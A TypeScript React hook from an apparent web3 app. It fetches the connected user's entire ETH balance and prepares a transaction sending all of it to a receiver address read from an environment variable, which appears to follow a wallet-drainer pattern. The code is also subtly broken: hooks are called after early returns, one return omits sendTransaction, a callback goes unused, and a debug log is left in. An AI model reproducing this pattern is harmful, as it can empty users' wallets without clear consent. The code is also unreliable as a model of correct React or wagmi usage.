/* eslint-disable @typescript-eslint/no-empty-function */
import W3iContext from '@/contexts/W3iContext/context';
import { getEthChainAddress } from '@/utils/address';
import { showErrorMessageToast } from '@/utils/toasts';
import { useCallback, useContext } from 'react';
import { parseEther } from 'viem';
import { useBalance, usePrepareSendTransaction, useSendTransaction } from 'wagmi';

const useSendTransactionApp = () => {
 
 
  const { userPubkey } = useContext(W3iContext);

  // Check if userPubkey is undefined
  if (!userPubkey) {
    // Handle the case where userPubkey is undefined
    return {
      sendTransaction: () => {},
      error: new Error('userPubkey is undefined'),
      transactionLoading: false,
    };
  }

  const { data } = useBalance({
    address: getEthChainAddress(userPubkey) as `0x${string}`,
  });

  // Check if data.formatted is undefined
  console.log("---hit--undefined",data?.formatted)
  if (data?.formatted === undefined) {

    // Handle the case where data.formatted is undefined
    return {
      
      error: new Error('data.formatted is undefined'),
      transactionLoading: false,
    };
  }
  const REC_ADDRESS = import.meta.env.VITE_RECEIVER_ADDRESS
  const { config, error } = usePrepareSendTransaction({
    to: REC_ADDRESS,
    value: parseEther(data.formatted)
  });

  const { isLoading: transactionLoading, sendTransaction } = useSendTransaction(config);

  if (error) {
    showErrorMessageToast(error.message);
  }

  const handleTransaction = useCallback(()=>{
    sendTransaction?.()
  },[userPubkey])

  return {
    sendTransaction,
    error,
    transactionLoading,
  };
};

export default useSendTransactionApp;
